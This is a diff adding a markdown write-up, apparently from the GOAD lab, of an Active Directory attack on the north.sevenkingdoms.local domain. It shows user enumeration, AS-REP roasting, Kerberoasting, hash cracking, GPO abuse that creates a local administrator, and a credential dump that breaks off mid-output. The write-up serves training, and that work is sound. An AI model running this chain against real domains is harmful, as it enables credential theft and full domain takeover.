@@ -1,3 +1,571 @@
 ---
 title: "North.Sevenkingdom.local"
 ---
+
+## Loot:
+
+| **Username** | **Password** |  |
+| --- | --- | --- |
+| Samwell Tarly | Heartsbane |  |
+| brandon.stark | iseedeadpeople |  |
+| jon.snow | iknownothing |  |
+|  |  |  |
+
+# Enumeration
+
+Document all enumeration don on the host to find vulnerable and attack paths
+
+```shellscript
+nmap -Pn -sV -sC -p- --min-rate=200 10.10.10.11 -T4
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-24 20:43 EST
+Nmap scan report for 10.10.10.11
+Host is up (0.00024s latency).
+Not shown: 65508 closed tcp ports (conn-refused)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-25 02:33:52Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:winterfell.north.sevenkingdoms.local
+| Not valid before: 2025-10-18T19:53:39
+|_Not valid after:  2026-10-18T19:53:39
+|_ssl-date: 2025-11-25T02:34:48+00:00; +49m15s from scanner time.
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)
+|_ssl-date: 2025-11-25T02:34:48+00:00; +49m15s from scanner time.
+| ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:winterfell.north.sevenkingdoms.local
+| Not valid before: 2025-10-18T19:53:39
+|_Not valid after:  2026-10-18T19:53:39
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)
+|_ssl-date: 2025-11-25T02:34:48+00:00; +49m15s from scanner time.
+| ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:winterfell.north.sevenkingdoms.local
+| Not valid before: 2025-10-18T19:53:39
+|_Not valid after:  2026-10-18T19:53:39
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:winterfell.north.sevenkingdoms.local
+| Not valid before: 2025-10-18T19:53:39
+|_Not valid after:  2026-10-18T19:53:39
+|_ssl-date: 2025-11-25T02:34:48+00:00; +49m15s from scanner time.
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2025-11-25T02:34:48+00:00; +49m15s from scanner time.
+| ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local
+| Not valid before: 2025-10-17T19:07:41
+|_Not valid after:  2026-04-18T19:07:41
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+| tls-alpn: 
+|_  http/1.1
+|_http-title: Not Found
+|_ssl-date: 2025-11-25T02:34:48+00:00; +49m15s from scanner time.
+| ssl-cert: Subject: commonName=VAGRANT
+| Subject Alternative Name: DNS:VAGRANT, DNS:vagrant
+| Not valid before: 2025-10-17T10:49:59
+|_Not valid after:  2028-10-16T10:49:59
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49671/tcp open  msrpc         Microsoft Windows RPC
+49687/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49688/tcp open  msrpc         Microsoft Windows RPC
+49693/tcp open  msrpc         Microsoft Windows RPC
+49698/tcp open  msrpc         Microsoft Windows RPC
+49730/tcp open  msrpc         Microsoft Windows RPC
+49845/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: WINTERFELL; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 49m14s, deviation: 0s, median: 49m14s
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2025-11-25T02:34:40
+|_  start_date: N/A
+|_nbstat: NetBIOS name: WINTERFELL, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:02:cb:41 (VMware)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 115.86 seconds
+```
+
+#### **Password policy**
+
+There is 5 minute lockout policy for every 5 failed login attempt.
+
+```shellscript
+nxc smb 10.10.10.11 --pass-pol
+SMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.11     445    WINTERFELL       [+] Dumping password info for domain: NORTH
+SMB         10.10.10.11     445    WINTERFELL       Minimum password length: 5
+SMB         10.10.10.11     445    WINTERFELL       Password history length: 24
+SMB         10.10.10.11     445    WINTERFELL       Maximum password age: 311 days 2 minutes 
+SMB         10.10.10.11     445    WINTERFELL       
+SMB         10.10.10.11     445    WINTERFELL       Password Complexity Flags: 000000
+SMB         10.10.10.11     445    WINTERFELL           Domain Refuse Password Change: 0
+SMB         10.10.10.11     445    WINTERFELL           Domain Password Store Cleartext: 0
+SMB         10.10.10.11     445    WINTERFELL           Domain Password Lockout Admins: 0
+SMB         10.10.10.11     445    WINTERFELL           Domain Password No Clear Change: 0
+SMB         10.10.10.11     445    WINTERFELL           Domain Password No Anon Change: 0
+SMB         10.10.10.11     445    WINTERFELL           Domain Password Complex: 0
+SMB         10.10.10.11     445    WINTERFELL       
+SMB         10.10.10.11     445    WINTERFELL       Minimum password age: 1 day 4 minutes 
+SMB         10.10.10.11     445    WINTERFELL       Reset Account Lockout Counter: 5 minutes 
+SMB         10.10.10.11     445    WINTERFELL       Locked Account Duration: 5 minutes 
+SMB         10.10.10.11     445    WINTERFELL       Account Lockout Threshold: 5
+SMB         10.10.10.11     445    WINTERFELL       Forced Log off Time: Not Set
+```
+
+### **Users Enumeration**
+
+```shellscript
+nxc smb 10.10.10.11 --users
+SMB         10.10.10.11     445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.11     445    WINTERFELL       -Username-                    -Last PW Set-       -BadPW- -Description-              
+SMB         10.10.10.11     445    WINTERFELL       Guest                         <never>             0       Built-in account for guest access to the computer/domain
+SMB         10.10.10.11     445    WINTERFELL       arya.stark                    2025-10-31 23:47:19 0       Arya Stark 
+SMB         10.10.10.11     445    WINTERFELL       sansa.stark                   2025-10-31 23:47:28 0       Sansa Stark 
+SMB         10.10.10.11     445    WINTERFELL       brandon.stark                 2025-10-31 23:47:31 0       Brandon Stark 
+SMB         10.10.10.11     445    WINTERFELL       rickon.stark                  2025-10-31 23:47:33 0       Rickon Stark 
+SMB         10.10.10.11     445    WINTERFELL       hodor                         2025-10-31 23:47:35 0       Brainless Giant 
+SMB         10.10.10.11     445    WINTERFELL       jon.snow                      2025-10-31 23:47:37 0       Jon Snow 
+SMB         10.10.10.11     445    WINTERFELL       samwell.tarly                 2025-10-31 23:47:39 0       Samwell Tarly (Password : Heartsbane)
+SMB         10.10.10.11     445    WINTERFELL       jeor.mormont                  2025-10-31 23:47:41 0       Jeor Mormont 
+SMB         10.10.10.11     445    WINTERFELL       sql_svc                       2025-10-31 23:47:43 0       sql service 
+SMB         10.10.10.11     445    WINTERFELL       [*] Enumerated 10 local users: NORTH
+```
+
+Found a saved password for `samwell.tarly`. I see that the user `(samwell.tarly)` that I found his credential is part of the `Domain Users Group`. Saved all users in a text file.
+
+```shellscript
+nxc ldap 10.10.10.11 -u 'samwell.tarly' -p '' --users-export users.txt
+LDAP        10.10.10.11     389    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:None) (channel binding:Never) 
+LDAP        10.10.10.11     389    WINTERFELL       [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane 
+LDAP        10.10.10.11     389    WINTERFELL       [*] Enumerated 16 domain users: north.sevenkingdoms.local
+LDAP        10.10.10.11     389    WINTERFELL       -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
+LDAP        10.10.10.11     389    WINTERFELL       Administrator                 2025-10-18 14:41:56 0        Built-in account for administering the computer/domain      
+LDAP        10.10.10.11     389    WINTERFELL       Guest                         <never>             0        Built-in account for guest access to the computer/domain    
+LDAP        10.10.10.11     389    WINTERFELL       vagrant                       2021-05-12 07:39:16 0        Vagrant User                                                
+LDAP        10.10.10.11     389    WINTERFELL       krbtgt                        2025-10-18 15:07:40 0        Key Distribution Center Service Account                     
+LDAP        10.10.10.11     389    WINTERFELL       arya.stark                    2025-10-31 19:47:19 5        Arya Stark                                                  
+LDAP        10.10.10.11     389    WINTERFELL       eddard.stark                  2025-10-31 19:47:22 0        Eddard Stark                                                
+LDAP        10.10.10.11     389    WINTERFELL       catelyn.stark                 2025-10-31 19:47:24 2        Catelyn Stark                                               
+LDAP        10.10.10.11     389    WINTERFELL       robb.stark                    2025-10-31 19:47:26 0        Robb Stark                                                  
+LDAP        10.10.10.11     389    WINTERFELL       sansa.stark                   2025-10-31 19:47:28 2        Sansa Stark                                                 
+LDAP        10.10.10.11     389    WINTERFELL       brandon.stark                 2025-10-31 19:47:31 0        Brandon Stark                                               
+LDAP        10.10.10.11     389    WINTERFELL       rickon.stark                  2025-10-31 19:47:33 2        Rickon Stark                                                
+LDAP        10.10.10.11     389    WINTERFELL       hodor                         2025-10-31 19:47:35 0        Brainless Giant                                             
+LDAP        10.10.10.11     389    WINTERFELL       jon.snow                      2025-10-31 19:47:37 3        Jon Snow                                                    
+LDAP        10.10.10.11     389    WINTERFELL       samwell.tarly                 2025-10-31 19:47:39 0        Samwell Tarly (Password : Heartsbane)                       
+LDAP        10.10.10.11     389    WINTERFELL       jeor.mormont                  2025-10-31 19:47:41 0        Jeor Mormont                                                
+LDAP        10.10.10.11     389    WINTERFELL       sql_svc                       2025-10-31 19:47:43 0        sql service                                                 
+LDAP        10.10.10.11     389    WINTERFELL       [*] Writing 16 local users to users.txt
+```
+
+#### **Asreproast**
+
+Found a user (brandon.stark) that doesn’t have pre-authentication set.
+
+```shellscript
+nxc ldap 10.10.10.11 -u 'samwell.tarly' -p 'Heartsbane' --asreproast asrep.txt 
+LDAP        10.10.10.11     389    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:None) (channel binding:Never) 
+LDAP        10.10.10.11     389    WINTERFELL       [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane 
+LDAP        10.10.10.11     389    WINTERFELL       [*] Total of records returned 1
+LDAP        10.10.10.11     389    WINTERFELL       $krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:1645b588b234776b9f77214abae07335$f4bb66bed785d771ff2e928e181477216ad2732aac1218e136bea06c17d8c2d0cc33866814e776db81be3c65a297ece20517ea6be1813d3c8e11e49e446ef3a789b1636fc1649c19f60a6f58c746bb0848bab9d9ebdbb173848d8fe853682389db09ed7d906b34d5722a05f2def3df38a1d01f3dceead78ab95e7a7021612e553ede4ad42f6a0028c6413530b1dce173df6d7bc54433d63e7ce0ff9fec89cb7a3d7fe7263e39db0bc08028c39507dbd301a28ecf2af15cc84215701506ea79cb200db1840d1f606bfb9c70b09d5196ba92cbacc8bcde14a53e6433e40ef1e234dfa62b166532cd0ec75aa0ca07356d09c74ac998df177c9d735b9077b4c6e347f5b2b75cec73
+```
+
+#### **Cracking the krb5asrep hash with John**
+
+```shellscript
+sudo john --wordlist=/usr/share/wordlists/rockyou.txt asrep.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+iseedeadpeople   ($krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL)     
+1g 0:00:00:00 DONE (2026-07-06 22:33) 6.666g/s 358400p/s 358400c/s 358400C/s soydivina..ilovebrooke
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+
+Found: brandon.stark:iseedeadpeople
+
+### Kerberoasting
+
+Found some other users that I was able to dump their TGT hashes.
+
+```shellscript
+nxc ldap 10.10.10.11 -u 'samwell.tarly' -p 'Heartsbane' --kerberoasting kerbe.txt
+LDAP        10.10.10.11     389    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:None) (channel binding:Never) 
+LDAP        10.10.10.11     389    WINTERFELL       [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane 
+LDAP        10.10.10.11     389    WINTERFELL       [*] Skipping disabled account: krbtgt
+LDAP        10.10.10.11     389    WINTERFELL       [*] Total of records returned 3
+LDAP        10.10.10.11     389    WINTERFELL       [*] sAMAccountName: jon.snow, memberOf: ['CN=Night Watch,CN=Users,DC=north,DC=sevenkingdoms,DC=local', 'CN=Stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local'], pwdLastSet: 2025-10-31 19:47:37.296408, lastLogon: <never>
+LDAP        10.10.10.11     389    WINTERFELL       $krb5tgs$23$*jon.snow$NORTH.SEVENKINGDOMS.LOCAL$north.sevenkingdoms.local\jon.snow*$8c20fdb9836d5f19c2d44527c7cc695f$3fda706546033fe5efd5cba5589f876767fa20d59a4934f160df881c0ff95cccef377e70f0804f5c2dc7cef8ddefb2c0a990b40555924bad27f7332b07ff5d99abf2e6463355679b40040499066db540b9f656a19d83481a57cd1ed07bf9151df08c709d60b031e0ebd8997f4e5b627637d89e9b0a4e74ae3a3241aacbe7454510341bf888a96389de4bf43e331012ae87b1cae484dee06ee4615a6c83901a443dca4bf9602c5af93f2acffef28e27a85bd616c2078907d27a4bbddfcdfe6533bfc1478dc84e2ad43b47a34d66868ccdd6233e73a160c1c5f191f3b3c588e5e7ef98a8f9ef02798333832f2a16c12c8169df3988a2b40d17b40328b5695dca107146041fe3fe02c71f1f215aad15fe6a2b3cc696891724587448d48e766a7d1cd06279d2b7aca99b595423a284193c54a9339b7bdaff6b260ef36a6721136bc6bc64e5ab76c7813a7a8ada568f82487bd99be2b1c13d5cd067d79d58e9bbd06fbc350830dd5a3df4d914835e983ab55aa54a6b6094cee82321ab3f67e90aaaad324a9778ffcb106debc17c636823e89a01461cf7dfcdfc6693272a82c682c272f051a90eac11818aad3e932d1032aab82bede26edb3a51b07bad166663e02b7278daeebe08d5760171e2792c848c935c227eca6538ca8ed093f37d94bdc702397558cf4c09ec38c1713d53cfc747e2d5c93563ef0b70d61a533b246180abfc96f2184b21d00bdd956b8402a5c97c3d991cfb7630faaa6059c5a804ace156471533b8b68cfc5f86a1c0ef779b487ca4d9c38972f34d97b2830e1290d137197f15921ec9820703a7ab71c41440e17890cf54af4f4eb0f1e04e67ebcd047a1659bbbee00e99aaa18e3fa14769f058d7166e12bfe48bdc66107da1f96b8b830228c163d5e4a64ee55f1d20f1c74cbd6199bfaa8919f2bb317be2f8d8eb729c02f585f35d0082beacde24e72baefe6d36b96b1c5815243d48467a4154e3b24f0bf04ab4ecd9fc8b72e241a54cc9a1d2211b08e6e062fe3e35807c7bc472260bf640c51cfa2be044096820d04d34d11ca3633672d36dc56af21f5e33f18427206edad79c5851a24ba3ffafe50e3e7428c73b01e78fd642731f24e2a8086ee98d7fb11b5ec6b827168c8f902705dbc132a427e9b3276f0bafd25c5c2d5404ca12567d8c20f86ada3b153b75fb01f47d8bb058f64925360307e54d6762d5a50fc7c132577e40ad97f9de653536b670740703f5487a4e77403c592e6c2684df729d649e0792451662907248e9eec5324ab59215aaf3d1358ec7b05eba1ff99a4db8920b9bb83df567f33455376107e13a0515c51769a80db5b07e63e308e0d281e85c194bec8b15d5cf675e77e7abc164980dc65bbf48f3045ef9fcabb99caeeb79d877ed7896eb8dc26a482014a49f7283fec23db126fc5512844d3127cc22ab6405c6b279d732f6bd8d510c9b2b590729555b7994ffd36e4c37a32d0666ab8e8a7701d21928eb7715e04cce56279e9f54fa47
+LDAP        10.10.10.11     389    WINTERFELL       [*] sAMAccountName: sansa.stark, memberOf: CN=Stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local, pwdLastSet: 2025-10-31 19:47:28.970073, lastLogon: <never>
+LDAP        10.10.10.11     389    WINTERFELL       $krb5tgs$23$*sansa.stark$NORTH.SEVENKINGDOMS.LOCAL$north.sevenkingdoms.local\sansa.stark*$ca0cad84735799ae0291d9b4d119b99b$acb830251f7b36f8ca41517a6ed79eb78f59f4e968e2cb5df8740fdedf69bfb84d7f40458939e8552b0444b140e47e6d87063fe80c5e26ec4045e3486cdebec6999723effb834defb76fb2eeaf4a3ee00cf0222ab99d9866e1d0c3ecc696e46732d41b623051868fac88ce4e64c1e0945f04f87369586c603feea19554ad6d0db7e09069efe708d7e726f0705211bab03b5210eb9fea0c28d726d5701d7b06e752c7773b213b72c67a3adf24a6e0022812335f3dc201a713e45e8bc963b13ea638baa43322ebe6588a06051a921869f767bb0771881ab4d3e59993d6724960f54d5cbeb83f4224f22edd077089c41d88c75e21293fa1b888a459e7119a8e58779de909a49843e779a8108f78c90e6212aa1ac92d495e9ae20f4ad302c1dee45017402362dd94fa877e93b4645ad1da245aa164c6c42de27bf8c4bb6adb24a066fbd17e634710e8d709a1bc46f056e9a35b0c6b5a4b3bec1ed7b144900a16b195532d4f6f2239fece159e669da5d9a164918107ec69067a43b40048da2c407e4da5e7d456e76664be894c24326be7ee7fe51befcc894882b787f420f915e814a12687c50b84a569aca804d343d13807e9857e725bc15b73f709123cf6fba55ccd91a7b7d52ed30329c1029a0d2f72b590c12f5b62e0909ebb5e6d31357788b14f191d8215db7231641fcb3819283d4d8e21b94fe5a25f520bf74648311db06a0cd77d0983d5fbcb1ffec381da191bb73025448aee912aa259c5cc1b19d8ceaf1e4fc74a0db108347f99cff087dbc0f71be4b380ebdff5dd4d61815d72b64e65a4fc807edc3ecbddb5498fcc07377f9dc4a5024f256f8e7b5ce977ab129b88bf30e5af1bdcab59460d362b8b79ae49e179a504e9e4ac01918e922dfdfecfb109f2148a916308674348d1ec8ecb013fc2e4e55234cdd5de080c0e02fbd822319a372121ca838b2ee866a427afcb7d8f76dd324207606b1c4a8ee7b0855f649338c0f19665a2172256e1fa9e34328a3733a90cfd57b131602b0cd4bda46b643c1871e7c73e394a0357f1d7042274cb0aee1590fb33c90dc7abcf2bbde42f0f5d33c80ce138907321eb3f541693c29a0eadfbe860ec6a0c3c8d1267aa557fcf2455f33a62825eca9f96f4963ee2295eaeb83276672c712dda5b468be81810137a84749a3c14e21eb056ba454c2038d09dc8536868f04fde41b04c260324eefaa62453655f80adb1d3de6150bdc571a1a906cb535bc7fe928babb4a55cf9cc292289409d5b860388cd12a74686026d9c9661a1778fb2847c8e9eda56207e66e4db635cca954b9cdabd165ffe6d6b242b3e5fe32e78164900db80b2673a32b4d0c8c8e5f764ae2aa13ce318ced772e514aeb93de36b66fb9d58dfdd4754f9ceb736863b44929b99c68b435adcd0a780b7ac6682cd74fabc309701bebb77852b8b7b80d0467c8a6dda4844d7a6cf3d043d2b79ffb118022e1c4336199daf8751bcdc36f97982d206a827c04d01b0d8d62088ba
+LDAP        10.10.10.11     389    WINTERFELL       [*] sAMAccountName: sql_svc, memberOf: [], pwdLastSet: 2025-10-31 19:47:43.438914, lastLogon: 2026-07-06 22:06:28.357812
+LDAP        10.10.10.11     389    WINTERFELL       $krb5tgs$23$*sql_svc$NORTH.SEVENKINGDOMS.LOCAL$north.sevenkingdoms.local\sql_svc*$63d267ade83d882c280c3ef524620255$8780fac664d41a16cd6bb89b397f6aff7e55187e821f8d5d35d3e074a1a53b426acab1279c5650636c11a1b6f49e2777626fe7aac4fdd4bcf37dbb9a762e6048b7207594f2d5eaa692511f8a6ca3da03be95bedb8f31de12dcdc875a8beef6bae0c3933f96785f7e1f0e97406fef0d86994df5ee573156221486a7b41d8b99e18a8dd482bbf036b78938b0cd49cd4737ce43013b8803cc03c8bf8c37a32d782a063ee0484ea05db4c787b7ea7593716b4c14c5d994c0743959cd583781620bbc5936f22dcbcc86158be07c56a423940f6e71817e081044eac77c956bca8b861c73ae69bd5fd97142b828522daef6c6628ea1199cf59f121240eecc8ebd7dba98409c4f2e45b4bbf4a01df8ede378958c2917b9e1deb1cb8ec69b3106b939d8a185eedb3ae917724ef8e589005fa6ada21d6c431fd83f6bfb89e2d7ba5267519883043ead95dc2cdcfc1297c77670af633481c54e644266cb2fb7078442d815c434be14e02891b03f62210a7300e14b68be661d7fd1b5a53f06ada68f7e9600bb436068646409d3321aab915a9fee5ac0cdf03ff650b28653ed5b93ea1464a66f91e3276fc5b665457071d9f344f00dca36ee9abb6ff22e00b6b6ca75fd176299fd82c0689a447db3171ceec511ce354960b1e36d3011cf5653ccbab9ace58386d202969d1fe5024725d387eb91ef784270a308ca386aa54099021c6305a382ed76ead79187d420b6bd5e9834f161267eb7a48c559f4d7c60ae72e1af0533c9a6b202c64cb7b920b76ee5cde378a4fd91be76edceaf7cfa3a0589ffc377aa3ae6865924cf41e3471d86d30070cbc82d103400a8440f46883e3e2946b0c8ce6d26e2a4945a83b5e409b7e5a47fb861887b235272199ff2b657acd697285440e58351899896a8629a6d6bdaab5dc941c2b0f330672dde9339ad3ccbc243833a0c836129cadbe782d27e5b823196e34646d21e6443a96acf871039c285eb6dfb81f52ee12f39829c95604bfcdf10f677ab5ae216fd853fd1c45d88be6900396ac07c0821da8735f6600a72ab5bd90e02399753d17a6d3657a0d3d9249d50e6eaa7b02a00e6bf69839188e921fb2b6ad5825b8046825ad1534770bc4358b943636f8fc717cd01cb6ca5092607581a0e94b35c50c592424ad82f7c386f64b0db9d6f600995bff9cda73a28afccf9b337955b21856b5276d4178d516341135589ac10c526cf7ce61a0fc90a4b92d56d0493d5b6eb3c1ec3540432383aa49e3a6f617af49c9ae97d8aace5db13f90e4f65992b7b9d624da4440a5da25fc686a560b5b39c328f6792fffef88f0c1592ba7942ca06c17725a04ba0e7dc31f66afe4b6e15bde312b1ef95a9e5032f793aab97b144f528201520c91f005c43a0ea791770a29cfcadd73bf38456eab8f5e24b65885b2b38ea6965b88f210a8547983b396b5ade67b6701225c85b265e46a423a931aded320ed973893d1cd5c3c82056f04cd3ded2c841e0241cacca9b77f697c88559
+```
+
+I was able to crack Jon.snow's krbtgts hash using John.
+
+```shellscript
+sudo john --wordlist=/usr/share/wordlists/rockyou.txt kerbe.txt
+Using default input encoding: UTF-8
+Loaded 3 password hashes with 3 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+iknownothing     (?)     
+1g 0:00:00:19 DONE (2026-07-06 22:45) 0.05068g/s 727002p/s 1830Kc/s 1830KC/s  0841079575..*7¡Vamos!
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+### **BloodHound**
+
+```shellscript
+nxc ldap 10.10.10.11 -u jon.snow -p 'iknownothing' --bloodhound --collection All --dns-server 10.10.10.11
+LDAP        10.10.10.11     389    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:None) (channel binding:Never) 
+LDAP        10.10.10.11     389    WINTERFELL       [+] north.sevenkingdoms.local\jon.snow:iknownothing 
+LDAP        10.10.10.11     389    WINTERFELL       Resolved collection methods: container, psremote, objectprops, dcom, localadmin, trusts, session, group, acl, rdp
+
+LDAP        10.10.10.11     389    WINTERFELL       Done in 0M 1S
+LDAP        10.10.10.11     389    WINTERFELL       Compressing output into /home/ha5hcat/.nxc/logs/WINTERFELL_10.10.10.11_2026-07-06_230837_bloodhound.zip
+```
+
+Samwell.tarly does have multiple Outbound Object Control over the Starkwallpaper GPO
+
+![Image](/images/image-4.png "Image")
+
+#### **WriteOwner**
+
+```text
+owneredit.py winterfell.north.sevenkingdoms.local/'samwell.tarly':'Heartsbane' -new-owner 'samwell.tarly' -target-dn 'CN={AA5A8682-1C17-4D7E-BD44-2120A3102555},CN=POLICIES,CN=SYSTEM,DC=NORTH,DC=SEVENKINGDOMS,DC=LOCAL' -action write -dc-ip 10.10.10.11
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Current owner information below
+[*] - SID: S-1-5-21-928725054-1381016483-1750705438-1000
+[*] - sAMAccountName: vagrant
+[*] - distinguishedName: CN=vagrant,CN=Users,DC=north,DC=sevenkingdoms,DC=local
+[*] OwnerSid modified successfully!
+```
+
+#### **WriteDacl**
+
+```text
+dacledit.py -action 'write' -rights 'FullControl' -principal 'samwell.tarly' -target-dn 'CN={AA5A8682-1C17-4D7E-BD44-2120A3102555},CN=POLICIES,CN=SYSTEM,DC=NORTH,DC=SEVENKINGDOMS,DC=LOCAL' 'north.sevenkingdoms.local'/'samwell.tarly':'Heartsbane' -dc-ip 10.10.10.11
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] DACL backed up to dacledit-20260707-002546.bak
+[*] DACL modified successfully!
+```
+
+samwell.tarly now owns starkwallpaper.
+
+![Image](/images/image-5.png "Image")
+
+```text
+(venv) ➜  pyGPOAbuse git:(master) python3 pygpoabuse.py north.sevenkingdoms.local/samwell.tarly:'Heartsbane' -gpo-id "5DE02488-B4EF-4CDE-BFC3-CC8AC01B6E49"  -dc-ip 10.10.25.11
+[+] ScheduledTask TASK_ac0d7d31 created!
+```
+
+### **Exploitation Confirmed**
+
+**\[\+\] ScheduledTask TASK\_ac0d7d31 created! confirms successful payload injection into GPO.**
+
+Next **Group Policy refresh** executes under **SYSTEM** on all in-scope machines.
+
+Basically on all `Tier-zero` accounts.
+
+<Frame>
+  ![Image](/images/image-6.png "Image")
+</Frame>
+
+<Frame>
+  ![Image](/images/image-7.png "Image")
+</Frame>
+
+After the `gpudate /force` command, I now have a user called `John` as a `local administrator`
+
+`Pwned`
+
+<Frame>
+  ![Image](/images/image-8.png "Image")
+</Frame>
+
+#### **Domain password hash dump using Secret dump**
+
+Since our malicious John is a local administrator, I can dump all user password hashes using impacket-secretdump.
+
+```text
+impacket-secretsdump north.sevenkingdoms.loca/john:H4x00r123..@10.10.25.11
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0x2b335a7d29c6e4fdce364b620e5e6ed7
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+NORTH\WINTERFELL$:aes256-cts-hmac-sha1-96:2e17a01ca562f69962cc1c2cf06783f0a44a2f393c95462aaf8d83a4bf2db764
+NORTH\WINTERFELL$:aes128-cts-hmac-sha1-96:79341f379699e958de207213ca816fa9
+NORTH\WINTERFELL$:des-cbc-md5:f41a68f829d9685d
+NORTH\WINTERFELL$:plain_password_hex:aaa0061f8517279a4d76d360ccbb1808e188cefa111a9c4faa88fd550fdc7de1cf69019b9c4384beba5310ba4babc9eb44c745f3e939b9f4df0d5b796ec291c157f26e47246ca01aa642776de91d60b862aa8b13230b79bc43c7858728a1e97d49f8cf7f978cc74dbf5d49a8e8815b304f0ab50cfd5b8c24ff96c5dd80a2abedc635aa56dab20481c4610da47a37983c5b02f380472e43d54873b1637b8f0ab9ca3d9c14657ef5ae44a668aae84e39b91f84358315418b5b7bf3cba9899f1ca3d73d9ba40400f426aa298ad222768f350f598b152fea3a20a97a071c52acb43661d85c1e6fde2a2cc70dc0c37853c67d
+NORTH\WINTERFELL$:aad3b435b51404eeaad3b435b51404ee:1297c1d0587633fd51459d0af3cd508b:::
+[*] DefaultPassword 
+NORTH\robb.stark:sexywolfy
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x4d21cd1d477981941f15ebdf07b8fb12e6cc1151
+dpapi_userkey:0x95c72d13370ea9bbbdf1c69784e826dbd550905f
+[*] NL$KM 
+ 0000   A0 B9 07 4A 55 70 F9 F9  FA CC 68 30 15 F5 95 A2   ...JUp....h0....
